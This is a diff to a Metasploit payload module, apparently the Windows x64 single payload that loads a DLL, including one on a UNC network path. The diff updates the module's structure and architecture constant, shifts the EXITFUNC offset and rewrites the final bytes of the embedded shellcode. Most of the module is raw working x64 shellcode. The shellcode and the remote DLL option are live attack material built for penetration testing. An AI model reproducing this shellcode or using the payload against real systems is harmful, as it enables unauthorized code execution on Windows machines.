@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+module MetasploitModule
 
-require 'msf/core'
-
-
-module Metasploit3
+  CachedSize = 313
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
@@ -19,7 +17,7 @@ module Metasploit3
       'Author'        => [ 'scriptjunkie', 'sf' ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
-      'Arch'          => ARCH_X86_64,
+      'Arch'          => ARCH_X64,
       'PayloadCompat' =>
         {
           'Convention' => '-http -https',
@@ -28,7 +26,7 @@ module Metasploit3
         {
           'Offsets' =>
             {
-              'EXITFUNC' => [ 228, 'V' ]
+              'EXITFUNC' => [ 227, 'V' ]
             },
           'Payload' =>
             "\xFC\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51" +
@@ -44,16 +42,16 @@ module Metasploit3
             "\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01" +
             "\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83" +
             "\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF" +
-            "\xFF\xFF\x5D\x67\x48\x8D\x8D\x00\x01\x00\x00\x41\xBA\x4C\x77\x26" +
-            "\x07\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5" +
-            "\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13" +
-            "\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5"
+            "\xFF\xFF\x5D\x48\x8D\x8D\xFF\x00\x00\x00\x41\xBA\x4C\x77\x26\x07" +
+            "\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48" +
+            "\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72" +
+            "\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5"
         }
       ))
     register_options(
       [
         OptString.new('DLL', [ true, "The library path to load (UNC is OK)" ]),
-      ], self.class )
+      ])
   end
 
   def generate
@@ -63,5 +61,4 @@ module Metasploit3
   def dll_string
     return datastore['DLL'] || ''
   end
-
 end
